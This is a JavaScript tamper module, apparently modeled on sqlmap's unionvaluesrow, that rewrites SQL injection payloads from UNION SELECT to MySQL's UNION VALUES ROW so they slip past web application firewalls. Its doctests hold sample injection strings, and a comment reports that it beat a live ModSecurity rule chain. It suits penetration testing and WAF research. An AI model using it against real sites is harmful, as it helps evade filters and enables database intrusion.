// 对标 sqlmap unionvaluesrow.py（MySQL 专用）：
// UNION SELECT <cols> 改写为 MySQL 表值构造器 UNION VALUES ROW(<cols>)
// MySQL 强制要求 ROW 关键字（MariaDB 等反而拒绝它，用 unionvalues）
// 带 FROM 子句的 payload 保持原样
export const unionvaluesrow = {
  name: 'unionvaluesrow',
  description: 'UNION SELECT cols → UNION VALUES ROW(cols)（MySQL 表值构造器，消除 SELECT）',
  // [批次 D5 2026-10-05] VALUES ROW 是 MySQL 8.0.19+ 语法：真机打穿链（modsec-live #162
  // 链对拍 2/19）但 **MariaDB 明确拒绝 ROW 关键字**、H2/HSQLDB/Derby 亦不认 ——
  // dbms 声明让 validateChain / applyTampers 在非 MySQL 目标上拒绝它（真机回归实测见
  // docs/WAF-真机链对拍-2026-10-05.md 的 multi-engine PL1 漂移记录）。
  dbms: ['MySQL'],
  doctests: [
    { input: '-1 UNION ALL SELECT NULL,CONCAT(0x71,0x41),NULL-- -', output: '-1 UNION ALL VALUES ROW(NULL,CONCAT(0x71,0x41),NULL)-- -' },
    { input: '-1 UNION SELECT 45,45#', output: '-1 UNION VALUES ROW(45,45)#' },
    { input: '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -', output: '-1 UNION ALL SELECT NULL,NULL FROM DUAL-- -' },
  ],
  /**
   * @param {string} payload
   * @returns {string}
   */
  transform(payload) {
    return String(payload ?? '').replace(
      /(UNION)(\s+ALL)?\s+SELECT\s+([\s\S]+?)(?=(?:--|#|\/\*)|$)/gi,
      (m, union, all, columns) => {
        const cols = columns.replace(/\s+$/, '');
        if (/\bFROM\b/i.test(cols)) return m;
        return `${union}${all || ''} VALUES ROW(${cols})`;
      }
    );
  },
};
export default unionvaluesrow;
